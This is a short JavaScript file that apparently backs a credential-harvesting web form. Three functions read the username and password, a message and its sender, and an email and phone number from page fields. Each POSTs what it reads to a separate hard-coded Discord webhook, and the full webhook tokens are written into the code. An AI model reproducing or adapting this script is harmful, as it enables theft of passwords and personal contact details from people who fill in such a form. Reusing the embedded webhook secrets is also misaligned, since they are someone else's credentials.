// Function to send the username and password to the first webhook
function Password() {
    let username = document.getElementById("Username").value;
    let password = document.getElementById("Password").value;

    const webhook = "https://discord.com/api/webhooks/1329461910554415249/NPew0IgAfTITm-6xo5pYsD0XmFY_P4zOTXlW7Oc1MTjTLfX6V3_Fs4aDS9j6MGc-S8Aw";
    
    const contents = `Message From WebHook Multi:\nLogin Details\nUsername: ${username}\nPassword: ${password}\n `;

    fetch(webhook, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: contents })
    })
    .then(response => {
        if (response.ok) {
            console.log("Password sent successfully.");
        } else {
            console.error("Failed to send password.");
        }
    })
    .catch(error => {
        console.error("Error sending webhook:", error);
    });
}

// Function to send the message and the sender information to the second webhook
function TextMessage() {
    let messageFrom = document.getElementById("MessageFrom").value;
    let textMessage = document.getElementById("TextMessage").value;

    const webhook = "https://discord.com/api/webhooks/1329815993597558894/dzxlVZNubLLC1DkLRfS1ZRLVyFDiWYEEzF9QoydnGyn6Lu6URBBoJETHtJfZRNM6ghyp";
    
    const contents = `Message From WebHook Multi:\nMessages Sent\nMessage From: ${messageFrom}\nTextMessage: ${textMessage}\n `;

    fetch(webhook, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: contents })
    })
    .then(response => {
        if (response.ok) {
            console.log("Text message sent successfully.");
        } else {
            console.error("Failed to send text message.");
        }
    })
    .catch(error => {
        console.error("Error sending webhook:", error);
    });
}

function PhoneNumber() {
    let Mail = document.getElementById("Mail").value;
    let PhoneNumber = document.getElementById("PhoneNumber").value;

    const webhook = "https://discord.com/api/webhooks/1329826936695820501/4LevMas0mxVtKNzHyxCyCRk9UpArqhY9X97gt5sctaIGP8Z5maVh8m87hJvH62TcRv8m";
    
    const contents = `Message From WebHook Multi:\nContact Details\nMail: ${Mail}\nPhoneNumber: ${PhoneNumber}\n`;

    fetch(webhook, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: contents })
    })
    .then(response => {
        if (response.ok) {
            console.log("Text message sent successfully.");
        } else {
            console.error("Failed to send text message.");
        }
    })
    .catch(error => {
        console.error("Error sending webhook:", error);
    });
}


